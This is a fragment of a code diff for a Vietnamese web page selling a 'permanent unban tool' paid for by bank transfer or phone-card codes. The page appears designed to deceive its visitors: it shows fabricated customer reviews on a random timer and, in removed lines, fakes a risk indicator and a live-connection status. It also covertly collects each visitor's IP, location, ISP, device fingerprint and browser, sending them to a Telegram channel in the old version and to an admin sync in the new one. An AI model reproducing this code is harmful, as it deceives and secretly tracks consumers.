+        Swal.fire({ icon: 'success', title: '✅ Gửi Thành Công!', text: `Mã đơn: #${state.currentOrderId}`, timer: 4000 });
+        playSound('notification');
+        
+        generateCaptcha();
+        document.getElementById('captchaAnswer').value = '';
+        
+      } catch (error) {
+        document.getElementById('resultBox').innerHTML = `<div style="color:#ff6b6b;"><h3>❌ Lỗi</h3><p>${error.message}</p></div>`;
         playSound('error');
       } finally {
         btn.disabled = false;
@@ -1612,11 +1296,7 @@
       p.addEventListener('click', function() {
         document.querySelectorAll('.plan').forEach(x => x.classList.remove('selected'));
         this.classList.add('selected');
-        state.plan = {
-          name: this.dataset.plan,
-          price: parseInt(this.dataset.price),
-          time: this.dataset.time
-        };
+        state.plan = { name: this.dataset.plan, price: parseInt(this.dataset.price), time: this.dataset.time };
         updatePrices();
       });
     });
@@ -1626,18 +1306,9 @@
         document.querySelectorAll('.payment-method-option').forEach(x => x.classList.remove('active'));
         this.classList.add('active');
         state.paymentMethod = this.dataset.method;
-        
         document.getElementById('bankInfo').classList.toggle('hidden', state.paymentMethod !== 'bank');
         document.getElementById('cardInfo').classList.toggle('hidden', state.paymentMethod !== 'card');
         document.getElementById('uploadSection').classList.toggle('hidden', state.paymentMethod !== 'bank');
-        
-        // Clear fields
-        if (state.paymentMethod === 'bank') {
-          document.getElementById('cardCode').value = '';
-          document.getElementById('cardSerial').value = '';
-        } else if (state.paymentMethod === 'card') {
-          removeImage();
-        }
       });
     });
 
@@ -1653,30 +1324,30 @@
     // INITIALIZATION
     // ============================================
     async function init() {
-      console.log('🚀 Khởi động Tool Mở Band Vĩnh Viễn v3.0...');
+      console.log('🚀 Khởi động Tool Mở Band Vĩnh Viễn...');
       
-      // Fetch IP
-      await fetchUserIP();
-      document.getElementById('userIpDisplay').textContent = userIP;
+      // Khởi tạo sync manager
+      syncManager = new SyncManager();
       
-      // Generate device fingerprint
+      // Lấy IP và vị trí
+      await fetchIPAndLocation();
       deviceFingerprint = await generateDeviceFingerprint();
-      document.getElementById('deviceHash').textContent = deviceFingerprint.substring(0, 8);
       
-      // Send visitor info to Telegram
-      const ipDetails = await fetchIPDetails(userIP);
-      sendToTelegram(`
-🟢 <b>NGƯỜI DÙNG MỚI TRUY CẬP</b>
-━━━━━━━━━━━━━━━━━━━━━━
-📡 <b>IP:</b> ${userIP}
-📍 <b>Vị trí:</b> ${ipDetails.city || 'Unknown'}, ${ipDetails.country || 'Unknown'}
-🏢 <b>ISP:</b> ${ipDetails.org || ipDetails.isp || 'Unknown'}
-🆔 <b>Device:</b> ${deviceFingerprint}
-🖥 <b>Trình duyệt:</b> ${navigator.userAgent.substring(0, 80)}
-⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
-      `.trim());
+      // Kiểm tra banned status
+      const banned = await checkBannedStatus();
+      if (banned) {
+        console.log('🚫 User is banned, stopping init');
+        return;
+      }
       
-      // Setup UI components
+      // Hiển thị vị trí
+      document.getElementById('userLocation').textContent = 
+        `${userLocation.city}, ${userLocation.country}`;
+      
+      // Gửi thông tin visitor về admin
+      await syncVisitorInfo();
+      
+      // Khởi tạo UI
       createParticles();
       generateCaptcha();
       updatePrices();
@@ -1684,49 +1355,39 @@
       startSocialProof();
       setupImageUpload();
       
-      // Add initial review after delay
+      // Reviews
       setTimeout(() => addRandomReview(), 5000);
+      setInterval(() => { if (Math.random() > 0.4 && !isBanned) addRandomReview(); }, 25000);
       
-      // Periodic review updates
-      setInterval(() => {
-        if (Math.random() > 0.4) addRandomReview();
-      }, 25000 + Math.random() * 20000);
-      
-      // Request notification permission
-      if (Notification.permission === 'default') {
-        Notification.requestPermission();
-      }
-      
-      // Update risk indicator periodically
-      setInterval(() => {
-        const riskLevels = ['Low', 'Low', 'Low', 'Low', 'Medium', 'Low'];
-        document.getElementById('riskLevel').textContent = riskLevels[Math.floor(Math.random() * riskLevels.length)];
-      }, 30000);
-      
-      // Simulate WebSocket connection
-      setTimeout(() => {
-        document.getElementById('wsStatus').className = 'ws-status ws-connected';
-        document.getElementById('wsStatusText').textContent = 'Connected';
-      }, 2000);
-      
-      // Update user level from history
-      const history = JSON.parse(localStorage.getItem('toolHistory') || '[]');
-      const completedOrders = history.filter(h => h.status === 'approved').length;
+      // User level
+      const orders = await syncManager.getAllOrders();
+      const completedOrders = Array.isArray(orders) ? orders.filter(o => o.status === 'completed').length : 0;
       document.getElementById('userLevel').textContent = Math.floor(completedOrders / 2) + 1;
       
-      console.log('✅ Tool Mở Band Vĩnh Viễn v3.0 đã sẵn sàng!');
-      console.log(`📡 IP: ${userIP} | 🆔 Device: ${deviceFingerprint}`);
+      // Đồng bộ định kỳ và kiểm tra banned
+      setInterval(async () => {
+        if (!isBanned && syncManager) {
+          await syncManager.syncAll();
+          // Kiểm tra lại banned status
+          const stillBanned = await syncManager.isIPBanned(userIP);
+          if (stillBanned && !isBanned) {
+            showBannedScreen();
+          }
+        }
+      }, 30000);
+      
+      console.log('✅ Tool Mở Band đã sẵn sàng!');
+      console.log(`📍 IP: ${userIP} | Vị trí: ${userLocation.city}, ${userLocation.country}`);
+      console.log(`🆔 Fingerprint: ${deviceFingerprint}`);
     }
 
-    // ============================================
-    // START APPLICATION
-    // ============================================
     init();
 
-    // Cleanup on page unload
     window.addEventListener('beforeunload', () => {
       if (state.countdownInterval) clearInterval(state.countdownInterval);
-      if (state.pollingInterval) clearInterval(state.pollingInterval);
+      if (syncManager && !isBanned) {
+        syncManager.addLog('VISITOR_EXIT', `User left: ${userIP}`);
+      }
     });
   </script>
 </body>
